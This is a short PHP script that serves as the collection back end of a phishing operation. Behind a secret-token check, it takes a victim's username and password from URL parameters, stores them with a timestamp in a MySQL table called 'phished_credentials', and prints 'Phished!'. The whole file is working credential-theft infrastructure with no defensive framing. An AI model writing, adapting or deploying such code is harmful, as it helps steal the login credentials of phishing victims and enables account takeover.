<?php
$servername = "CONFIGURE_DB_IP";
$username = "CONFIGURE_DB_USER";
$password = "CONFIGURE_DB_PASS";
$dbname = "CONFIGURE_DB_NAME";

$secret = "CONFIGURE_SECRET_TOKEN";

if ($secret === $_GET['s']) {

$phished_username = $_GET['u'];
$phished_password = $_GET['p'];

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

echo "Connected successfully<br/>";

$stmt = $conn->prepare("INSERT INTO phished_credentials (username, password, timestamp) VALUES (?, ?, ?)");
$stmt->bind_param("sss", $phished_username, $phished_password, date_create()->format('Y-m-d H:i:s'));

$stmt->execute();

echo "Phished!";

$stmt->close();
$conn->close();

} else echo "Mind your business hax0r"
